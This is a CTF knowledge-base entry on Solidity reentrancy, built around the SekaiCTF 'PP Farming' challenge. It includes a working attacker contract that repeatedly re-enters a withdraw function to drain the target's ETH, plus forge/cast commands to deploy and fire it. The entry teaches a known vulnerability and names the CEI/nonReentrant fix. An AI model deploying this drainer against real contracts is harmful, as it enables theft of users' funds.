---
id: web3-reentrancy-checks-effects-interactions
category: WEB
tags: [web3, blockchain, evm, solidity, reentrancy, checks-effects-interactions, external-call, receive, fallback, withdraw, drain, state-after-call, attacker-contract, sekaictf, pp-farming, foundry, cast]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: reentrancy (state updated AFTER the external call) drained by an attacker contract"
difficulty: medium
created: 2026-10-08
updated: 2026-10-08
related: [web3-receive-fallback-weak-access-control, web3-weak-onchain-randomness-blockhash, web3-delegatecall-storage-collision-proxy]
---

## How to recognize this pattern

- A withdraw/transfer function that makes an **external call sending ETH** (`msg.sender.call{value:
  ...}("")`, `.transfer`, `.send`) and **only zeroes/updates the balance AFTER** the call. Violates
  checks-effects-interactions (the "effect" comes after the "interaction").
- Typical goal: `isSolved()` = `address(this).balance == 0` (drain the contract), or steal more than
  you deposited.
- Your contract's `receive()`/`fallback()` runs in the middle of the `call`, before the reset → you can
  re-enter the withdraw function while the old state still holds.

## Method

Reference case: SekaiCTF, PP Farming. A `PerformancePointATM` with 10 ETH,
`isSolved()==balance==0`. `withdrawPP()` does `msg.sender.call{value: score}` and only then
`scores[msg.sender]=0`.

Toolchain: Foundry. See `Manuals/Web3/3. Contexto para Claude.md`.

### Attacker contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IATM { function donatePP(address) external payable; function withdrawPP() external; }
contract Exploit {
    IATM atm; uint256 chunk; address payable owner;
    constructor(address t) payable { atm = IATM(t); owner = payable(msg.sender); }
    function attack() external payable {
        chunk = msg.value;
        atm.donatePP{value: msg.value}(address(this));  // seeds score = msg.value
        atm.withdrawPP();                               // starts the reentrant chain
        owner.transfer(address(this).balance);          // sweep the profit
    }
    receive() external payable {
        if (address(atm).balance >= chunk) atm.withdrawPP();  // re-enter while there's balance
    }
}
```

The **`chunk` guard** avoids the last re-entry that would fail when the target no longer has enough ETH
to pay a full withdrawal.

```bash
FORGE=~/.config/.foundry/bin/forge; CAST=~/.config/.foundry/bin/cast
RPC="<rpc>"; PK="<private key>"; TARGET="<vulnerable ATM>"
$FORGE create exploit/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK --broadcast --constructor-args $TARGET
EXPLOIT=<"Deployed to:">
$CAST send $EXPLOIT "attack()" --value 1ether --rpc-url $RPC --private-key $PK
$CAST call $TARGET "isSolved()(bool)" --rpc-url $RPC    # true when balance==0
```

In PP Farming: a 1 ETH seed → the ATM holds 11 ETH → the same 1 ETH is withdrawn 11x by the recursion →
balance zeroes.

## Gotchas

- You need to **seed state** first (here `donatePP` to get `score > 0`); without it the withdraw's
  `require` reverts on the 1st call.
- The re-withdrawn value is always the old `score` (it wasn't zeroed); that's why the drain multiplies
  the seed.
- Without the balance guard, the last re-entry reverts and can take the whole tx down; guard against
  `address(atm).balance >= chunk`.
- Solidity ≥0.8 changes nothing here (it's not overflow); the real fix is CEI or `nonReentrant`. If the
  target "fixed" it with a guard/refactor, see `web3-delegatecall-storage-collision-proxy` (it may have
  opened another hole).

## Related / Cross-reference

- Confirmed source: the SekaiCTF-2026 `blockchain/pp-farming/`: `handout/PerformancePointATM.sol`
  (vulnerable, `scores[msg.sender]=0` after the `call`; `isSolved()=balance==0`) +
  `exploit/PPFarmExploit.sol` + `exploit/solve.sh`.
- `Arsenal/WEB/web3-delegatecall-storage-collision-proxy.md`: PP Farming's "fix" that reopens the drain
  via another vector (PP Farming 2).
- `Manuals/Web3/3. Contexto para Claude.md`: `forge`/`cast` and the `instance.json` flow.
